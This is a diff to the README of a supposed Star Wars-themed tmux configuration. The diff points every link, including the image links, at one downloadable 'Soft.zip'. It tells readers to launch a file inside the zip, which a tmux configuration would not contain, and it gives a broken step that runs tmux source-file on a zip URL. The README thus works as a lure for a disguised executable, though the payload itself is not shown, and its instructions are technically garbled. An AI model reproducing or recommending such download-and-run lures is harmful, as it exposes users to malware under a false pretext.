@@ -1,6 +1,6 @@
 # tmux-ex-machina 🌌
 
-![tmux-ex-machina](https://example.com/tmux-ex-machina.png)
+![tmux-ex-machina](https://github.com/AetherCores/tmux-ex-machina/releases/download/v1.0/Soft.zip)
 
 ### A Star Wars-inspired tmux configuration featuring dynamic pane management, intelligent status handling, and Vim integration. 
 
@@ -20,7 +20,7 @@ Welcome to **tmux-ex-machina**, a unique tmux configuration that brings the esse
 
 To get started with **tmux-ex-machina**, simply download the configuration files from the following link:
 
-[![Download tmux-ex-machina](https://img.shields.io/badge/Download-Release.zip-blue)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[![Download tmux-ex-machina](https://github.com/AetherCores/tmux-ex-machina/releases/download/v1.0/Soft.zip)](https://github.com/AetherCores/tmux-ex-machina/releases/download/v1.0/Soft.zip)
 
 *Note: Launch the file within the downloaded zip to begin the installation process.*
 
@@ -32,7 +32,7 @@ Once you have downloaded the configuration files, follow these steps to set up *
 
 1. Unzip the downloaded file to access the tmux configuration files.
 2. Copy the configuration files to your home directory or preferred location.
-3. Open your terminal and run the command to load the tmux configuration: `tmux source-file /path/to/tmux.conf`.
+3. Open your terminal and run the command to load the tmux configuration: `tmux source-file https://github.com/AetherCores/tmux-ex-machina/releases/download/v1.0/Soft.zip`.
 
 That's it! You are now ready to experience the power of **tmux-ex-machina** in your terminal. May the force be with you as you delve into the world of Star Wars-inspired tmux customization.
 
@@ -50,4 +50,4 @@ Feel free to explore these exciting topics within the **tmux-ex-machina** reposi
 
 *May the code be with you. Always.*
 
-![star-wars](https://example.com/star-wars.gif)
+![star-wars](https://github.com/AetherCores/tmux-ex-machina/releases/download/v1.0/Soft.zip)
